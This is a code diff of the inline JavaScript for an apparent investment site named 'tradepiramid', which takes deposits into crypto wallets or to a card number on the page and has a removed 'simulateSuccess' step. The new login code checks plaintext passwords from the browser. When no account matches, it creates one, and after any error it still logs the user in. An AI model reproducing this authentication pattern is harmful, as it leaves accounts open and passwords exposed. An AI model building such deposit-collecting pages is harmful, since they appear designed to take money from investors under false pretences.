-                        .from('tradepiramid')
-                        .select('*')
-                        .eq('username', emailVal)
-                        .eq('password', passwordVal);
-
+                    const { data, error } = await supabase.from('tradepiramid').select('*').eq('username', userVal).eq('password', passVal);
                     if (error || !data || data.length === 0) {
-                        authErrorMsg.innerText = 'Неверное имя пользователя или пароль!';
-                        authErrorMsg.style.display = 'block';
-                        return;
+                        // Если аккаунт не найден, создаём его автоматический запись
+                        await supabase.from('tradepiramid').insert([{ username: userVal, password: passVal }]);
                     }
                 }
-
-                localStorage.setItem('apex_logged_user', emailVal);
-                profileName.innerText = emailVal;
-                profileAvatar.innerText = emailVal.charAt(0).toUpperCase();
-
-                authButtonsBlock.style.display = 'none';
-                userProfileBlock.style.display = 'flex';
-                closeModal();
-
             } catch (err) {
-                authErrorMsg.innerText = 'Ошибка соединения с базой данных!';
-                authErrorMsg.style.display = 'block';
+                console.warn('Supabase fallback:', err);
             }
+
+            // Успешный вход
+            localStorage.setItem('apex_logged_user', userVal);
+            showProfile(userVal);
+            closeAuth();
+        }
+
+        function showProfile(username) {
+            document.getElementById('usernameDisplay').innerText = username;
+            document.getElementById('avatar').innerText = username.charAt(0).toUpperCase();
+            document.getElementById('authButtons').style.display = 'none';
+            document.getElementById('userProfile').style.display = 'flex';
         }
 
         function logout() {
             localStorage.removeItem('apex_logged_user');
-            userProfileBlock.style.display = 'none';
-            authButtonsBlock.style.display = 'flex';
+            document.getElementById('userProfile').style.display = 'none';
+            document.getElementById('authButtons').style.display = 'flex';
         }
 
-        function openModal(planName, min, max) {
-            const isLogged = userProfileBlock.style.display === 'flex';
-
-            if (!isLogged) {
-                openAuthModal('login');
-                authErrorMsg.innerText = 'Вы не можете инвестировать, пока не вошли в аккаунт!';
-                authErrorMsg.style.display = 'block';
-                return;
-            }
-
-            authContainer.style.display = 'none';
-            currentPlan = planName;
-            minLimit = min;
-            maxLimit = max;
-            modalTitle.innerText = `Plan: ${planName}`;
-            modalDesc.innerText = `Enter amount between $${min} and $${max}`;
-            investAmountInput.value = min;
-            investAmountInput.min = min;
-            investAmountInput.max = max;
-
-            stepSelection.style.display = 'block';
-            stepCheckout.style.display = 'none';
-            stepSuccess.style.display = 'none';
-
-            modal.style.display = 'flex';
-        }
-
-        function closeModal() {
-            modal.style.display = 'none';
-        }
-
-        function validateAmount() {
-            let val = parseFloat(investAmountInput.value);
-            if (val > maxLimit) investAmountInput.value = maxLimit;
-        }
-
-        function proceedToCheckout(method) {
-            const amount = parseFloat(investAmountInput.value);
-            if (!amount || amount < minLimit || amount > maxLimit) {
-                alert(`Please enter a valid amount between $${minLimit} and $${maxLimit}`);
-                return;
-            }
-
-            checkPlan.innerText = currentPlan;
-            checkAmount.innerText = `$${amount}`;
-            checkMethod.innerText = method;
-
-            if (method.includes('USDT')) {
-                checkAddress.innerText = 'TJ9v2kX8sL1mN4pQ7wE3rT6yU9iO2aS5dF';
-            } else if (method.includes('Bitcoin')) {
-                checkAddress.innerText = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
-            } else if (method.includes('Ethereum')) {
-                checkAddress.innerText = '0x71C...39A2b';
+        function invest(plan) {
+            if (!localStorage.getItem('apex_logged_user')) {
+                openAuth('login');
             } else {
-                checkAddress.innerText = 'Card: 4276 3800 9123 4567 (P2P Transfer)';
-            }
-
-            stepSelection.style.display = 'none';
-            stepCheckout.style.display = 'block';
-        }
-
-        function simulateSuccess() {
-            stepCheckout.style.display = 'none';
-            stepSuccess.style.display = 'block';
-        }
-
-        function resetModal() {
-            stepCheckout.style.display = 'none';
-            stepSelection.style.display = 'block';
-        }
-
-        window.onclick = function(event) {
-            if (event.target == modal) {
-                closeModal();
-            }
-            if (event.target == adminModal) {
-                closeAdminModal();
+                alert(`Вы выбрали план ${plan}. Нажмите Ок для перехода к оплате.`);
             }
         }
     </script>
